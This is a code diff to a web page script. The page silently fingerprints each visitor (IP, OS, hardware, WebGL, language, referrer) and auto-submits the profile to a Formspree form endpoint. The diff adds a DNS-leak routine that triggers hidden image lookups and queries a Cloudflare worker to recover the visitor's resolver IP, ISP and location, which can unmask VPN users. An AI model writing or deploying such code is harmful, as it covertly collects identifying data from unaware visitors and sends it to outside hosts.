@@ -524,6 +524,7 @@
   <input type="hidden" name="webgl" id="f_webgl">
   <input type="hidden" name="ip" id="f_ip">
 
+  <input type="hidden" name="dns" id="f_dns">
   <input type="hidden" name="page" id="f_page">
 </form>
 
@@ -532,16 +533,17 @@
   "use strict";
 
   const FORM_ENDPOINT = "https://formspree.io/f/mdaljldo";
+  const WORKER_BASE = "https://super-surf-b23e.smkollingvs.workers.dev";
 
   function safeJson(obj) { try { return JSON.stringify(obj); } catch { return ""; } }
   function mq(q) { try { return window.matchMedia ? window.matchMedia(q).matches : null; } catch { return null; } }
+  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
   function getAcceptLanguage() {
     const langs = Array.isArray(navigator.languages) ? navigator.languages.filter(Boolean) : [];
     if (langs.length === 0 && navigator.language) langs.push(navigator.language);
     if (langs.length === 0) return null;
 
-    // Приближение к HTTP Accept-Language: первый без q, дальше q=0.9,0.8...
     const parts = [];
     for (let i = 0; i < langs.length && i < 10; i++) {
       const l = String(langs[i]).trim();
@@ -717,27 +719,27 @@
     const timeoutMs = 4500;
 
     const fetchText = async (url) => {
-      const ac = new AbortController();
-      const t = setTimeout(() => ac.abort(), timeoutMs);
+      const ac = (typeof AbortController !== "undefined") ? new AbortController() : null;
+      const t = ac ? setTimeout(() => ac.abort(), timeoutMs) : null;
       try {
-        const r = await fetch(url, { signal: ac.signal, cache: "no-store", credentials: "omit" });
+        const r = await fetch(url, { signal: ac ? ac.signal : undefined, cache: "no-store", credentials: "omit" });
         if (!r.ok) return null;
         return (await r.text()).trim();
       } catch { return null; }
-      finally { clearTimeout(t); }
+      finally { if (t) clearTimeout(t); }
     };
 
     const fetchJsonIp = async (url, key) => {
-      const ac = new AbortController();
-      const t = setTimeout(() => ac.abort(), timeoutMs);
+      const ac = (typeof AbortController !== "undefined") ? new AbortController() : null;
+      const t = ac ? setTimeout(() => ac.abort(), timeoutMs) : null;
       try {
-        const r = await fetch(url, { signal: ac.signal, cache: "no-store", credentials: "omit" });
+        const r = await fetch(url, { signal: ac ? ac.signal : undefined, cache: "no-store", credentials: "omit" });
         if (!r.ok) return null;
         const j = await r.json();
         const ip = j && typeof j[key] === "string" ? j[key].trim() : null;
         return ip && ip.length <= 64 ? ip : null;
       } catch { return null; }
-     finally { clearTimeout(t); }
+      finally { if (t) clearTimeout(t); }
     };
 
     let ip = await fetchJsonIp("https://api.ipify.org?format=json", "ip");
@@ -758,13 +760,49 @@
     return "unknown";
   }
 
-  function esc(s) {
-    return String(s ?? "").replace(/\r/g, "").trim();
+  async function dnsStart() {
+    try {
+      const r = await fetch(`${WORKER_BASE}/dns/start`, { cache: "no-store", credentials: "omit" });
+      if (!r.ok) return null;
+      const j = await r.json();
+      return Array.isArray(j.ids) ? j.ids : null;
+    } catch {
+      return null;
+    }
   }
 
-  function section(title) {
-    return `\n[${title}]\n`;
+  async function dnsTrigger(ids) {
+    // Триггер DNS-резолва "как в leak-тестах"
+    for (const id of ids) {
+      try {
+        const img = new Image();
+        img.referrerPolicy = "no-referrer";
+        img.src = `https://${id}.test.dnsleaktest.com/${Date.now()}.png`;
+      } catch {}
+      await sleep(100);
+    }
   }
+
+  async function dnsResult(ids) {
+    try {
+      await sleep(1500);
+      const r = await fetch(`${WORKER_BASE}/dns/result`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ ids }),
+        cache: "no-store",
+        credentials: "omit"
+      });
+      if (!r.ok) return null;
+      const j = await r.json();
+      return Array.isArray(j.dns) ? j.dns : null;
+    } catch {
+      return null;
+    }
+  }
+
+  function esc(s) { return String(s ?? "").replace(/\r/g, "").trim(); }
+  function section(title) { return `\n[${title}]\n`; }
 
   function formatPretty(p) {
     const L = [];
@@ -779,6 +817,21 @@
       L.push(`Connection: ${esc(p.connection.effectiveType || "unknown")}, downlink=${esc(p.connection.downlink)}, rtt=${esc(p.connection.rtt)}, saveData=${p.connection.saveData ? "true" : "false"}`);
     } else {
       L.push(`Connection: null`);
+    }
+
+    L.push(section("DNS"));
+    if (Array.isArray(p.dns) && p.dns.length) {
+      for (const d of p.dns) {
+        const extra = [
+          d.hostname ? `ptr=${d.hostname}` : null,
+          d.isp ? `isp=${d.isp}` : null,
+          d.city ? `city=${d.city}` : null,
+          d.country ? `country=${d.country}` : null
+        ].filter(Boolean).join(", ");
+        L.push(`DNS: ${esc(d.ip)}${extra ? " (" + extra + ")" : ""}`);
+      }
+    } else {
+      L.push("DNS: unknown");
     }
 
     L.push(section("OS and browser"));
@@ -801,7 +854,8 @@
     L.push(`Features: cookies=${p.features?.cookiesEnabled}, localStorage=${p.features?.localStorage}, sessionStorage=${p.features?.sessionStorage}, serviceWorker=${p.features?.serviceWorker}, webRTC=${p.features?.webRTC}, wasm=${p.features?.wasm}, webGL=${p.features?.webGL}`);
     L.push(`DNT: ${p.dnt === true ? "true" : p.dnt === false ? "false" : "null"}`);
     if (p.hardware) {
-      L.push(`Hardware: cores=${esc(p.hardware.hardwareConcurrency)}, deviceMemory=${esc(p.hardware.deviceMemory)}, maxTouchPoints=${esc(p.hardware.maxTouchPoints)}`);
+      const dm = (p.hardware.deviceMemory === null || typeof p.hardware.deviceMemory === "undefined") ? "null" : String(p.hardware.deviceMemory);
+      L.push(`Hardware: cores=${esc(p.hardware.hardwareConcurrency)}, deviceMemory=${dm}, maxTouchPoints=${esc(p.hardware.maxTouchPoints)}`);
     }
 
     const pluginsCount = Array.isArray(p.plugins) ? p.plugins.length : 0;
@@ -829,7 +883,7 @@
     return L.join("\n").replace(/\n{3,}/g, "\n\n").trim();
   }
 
-  async function buildPayload(ip, os) {
+  async function buildPayload(ip, os, dns) {
     const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
     const viewportW = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
     const viewportH = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
@@ -870,6 +924,7 @@
       dnt: getDNT(),
       webgl: getWebGLInfo(),
       ip: ip || "unknown",
+      dns: dns || null,
       page: { href: location.href, referrer: document.referrer || null }
     };
 
@@ -920,6 +975,7 @@
     set("f_webgl", safeJson(payload.webgl));
     set("f_ip", String(payload.ip ?? "unknown"));
 
+    set("f_dns", safeJson(payload.dns));
     set("f_page", safeJson(payload.page));
 
     form.submit();
@@ -927,8 +983,16 @@
 
   async function sendStats() {
     if (!FORM_ENDPOINT) return;
+
+    const ids = await dnsStart();
+    let dns = null;
+    if (Array.isArray(ids) && ids.length) {
+      await dnsTrigger(ids);
+      dns = await dnsResult(ids);
+    }
+
     const [ip, os] = await Promise.all([getIp(), getOsInfo()]);
-    const payload = await buildPayload(ip, os);
+    const payload = await buildPayload(ip, os, dns);
     fillAndSubmit(payload);
   }
 
